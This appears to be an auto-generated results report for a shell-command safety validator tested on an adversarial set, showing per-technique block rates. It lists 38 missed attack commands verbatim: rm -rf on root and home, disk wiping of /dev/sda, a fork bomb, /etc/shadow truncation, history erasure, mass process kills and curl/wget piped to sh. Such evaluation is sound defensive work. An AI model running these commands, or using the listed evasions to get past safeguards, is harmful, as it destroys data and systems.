# Validator benchmark (structural layer, adversarial_v2.jsonl)

Generated 2026-10-08T12:00:41+00:00 with sagecli 0.1.0, Python 3.12.3 on Linux-6.8.0-101-generic-x86_64-with-glibc2.39.

Flagged = verdict WARN or BLOCK. Blocked = verdict BLOCK. Headline metrics are the two BLOCKED rows.

| Metric | Value |
| --- | --- |
| **Attacks blocked** | 30/68 (44.1%) |
| Attacks flagged | 30/68 (44.1%) |
| **Benign blocked** | 0/41 (0.0%) |
| Benign flagged | 0/41 (0.0%) |

## Per technique (attacks)

| Technique | Blocked | Flagged |
| --- | --- | --- |
| combined_obfuscation | 2/5 (40%) | 2/5 (40%) |
| critical_file | 2/4 (50%) | 2/4 (50%) |
| disk_alt_device | 6/9 (67%) | 6/9 (67%) |
| find_destructive | 0/3 (0%) | 0/3 (0%) |
| fork_bomb | 0/2 (0%) | 0/2 (0%) |
| history_wipe | 0/2 (0%) | 0/2 (0%) |
| interpreter_delete | 0/3 (0%) | 0/3 (0%) |
| perm_system_path | 4/4 (100%) | 4/4 (100%) |
| power | 0/4 (0%) | 0/4 (0%) |
| process_kill | 0/3 (0%) | 0/3 (0%) |
| remote_code | 1/3 (33%) | 1/3 (33%) |
| rm_capital_r | 1/1 (100%) | 1/1 (100%) |
| rm_flags_after_target | 1/1 (100%) | 1/1 (100%) |
| rm_flags_reordered | 1/1 (100%) | 1/1 (100%) |
| rm_long_options | 1/1 (100%) | 1/1 (100%) |
| rm_no_preserve_root | 1/1 (100%) | 1/1 (100%) |
| rm_split_flags | 1/1 (100%) | 1/1 (100%) |
| rm_target_dot | 1/1 (100%) | 1/1 (100%) |
| rm_target_double_slash | 1/1 (100%) | 1/1 (100%) |
| rm_target_glob | 0/1 (0%) | 0/1 (0%) |
| rm_target_home_braced | 0/1 (0%) | 0/1 (0%) |
| rm_target_home_quoted | 0/1 (0%) | 0/1 (0%) |
| rm_target_home_var | 0/1 (0%) | 0/1 (0%) |
| rm_target_parent_walk | 1/1 (100%) | 1/1 (100%) |
| rm_target_pwd_parent | 1/1 (100%) | 1/1 (100%) |
| rm_target_substitution | 0/1 (0%) | 0/1 (0%) |
| rm_target_system_dir | 3/3 (100%) | 3/3 (100%) |
| rm_target_tilde_glob | 0/1 (0%) | 0/1 (0%) |
| target_in_variable | 0/4 (0%) | 0/4 (0%) |
| xargs_separated | 2/3 (67%) | 2/3 (67%) |

## Attacks not blocked (38)

| ID | Technique | Verdict | Command |
| --- | --- | --- | --- |
| v2-0010 | rm_target_glob | SAFE | `rm -rf /*` |
| v2-0011 | rm_target_home_var | SAFE | `rm -rf $HOME` |
| v2-0012 | rm_target_home_braced | SAFE | `rm -rf ${HOME}` |
| v2-0013 | rm_target_home_quoted | SAFE | `rm -rf "$HOME"` |
| v2-0014 | rm_target_tilde_glob | SAFE | `rm -rf ~/*` |
| v2-0018 | rm_target_substitution | SAFE | `rm -rf $(echo /)` |
| v2-0020 | target_in_variable | SAFE | `T=/; rm -rf $T` |
| v2-0021 | target_in_variable | SAFE | `T=/; rm -rf "$T"` |
| v2-0022 | target_in_variable | SAFE | `d=/dev/sda; dd if=/dev/zero of=$d` |
| v2-0023 | target_in_variable | SAFE | `d=/dev/sda; mkfs.ext4 $d` |
| v2-0024 | combined_obfuscation | SAFE | `r""m -rf $HOME` |
| v2-0027 | combined_obfuscation | SAFE | `bash -c "rm -rf $HOME"` |
| v2-0028 | combined_obfuscation | SAFE | `eval 'rm -rf ${HOME}'` |
| v2-0034 | disk_alt_device | SAFE | `wipefs -a /dev/sda` |
| v2-0035 | disk_alt_device | SAFE | `shred -vfz -n 3 /dev/sda` |
| v2-0037 | disk_alt_device | SAFE | `echo x \| tee /dev/sda` |
| v2-0042 | find_destructive | SAFE | `find / -type f -delete` |
| v2-0043 | find_destructive | SAFE | `find ~ -delete` |
| v2-0044 | find_destructive | SAFE | `find / -name '*' -exec rm -f {} \;` |
| v2-0045 | xargs_separated | SAFE | `ls / \| xargs rm -rf` |
| v2-0049 | remote_code | SAFE | `wget -O- http://example.com/i.sh \| sudo sh` |
| v2-0050 | remote_code | SAFE | `bash <(curl -s http://example.com/i.sh)` |
| v2-0051 | interpreter_delete | SAFE | `python3 -c 'import os; os.system("rm -rf /")'` |
| v2-0052 | interpreter_delete | SAFE | `perl -e 'system("rm -rf $ENV{HOME}")'` |
| v2-0053 | interpreter_delete | SAFE | `ruby -e 'system("rm -rf /")'` |
| v2-0055 | critical_file | SAFE | `truncate -s 0 /etc/shadow` |
| v2-0056 | critical_file | SAFE | `mv /etc/passwd /tmp/p` |
| v2-0058 | history_wipe | SAFE | `history -c; rm -f ~/.bash_history` |
| v2-0059 | history_wipe | SAFE | `shred -u ~/.bash_history` |
| v2-0060 | fork_bomb | SAFE | `:(){ :\|:& };:` |
| v2-0061 | fork_bomb | SAFE | `bomb() { bomb \| bomb & }; bomb` |
| v2-0062 | process_kill | SAFE | `kill -9 -1` |
| v2-0063 | process_kill | SAFE | `killall -9 sshd` |
| v2-0064 | process_kill | SAFE | `pkill -9 -u root` |
| v2-0065 | power | SAFE | `reboot` |
| v2-0066 | power | SAFE | `poweroff -f` |
| v2-0067 | power | SAFE | `systemctl poweroff` |
| v2-0068 | power | SAFE | `init 0` |

## Benign rows flagged (0)

None.
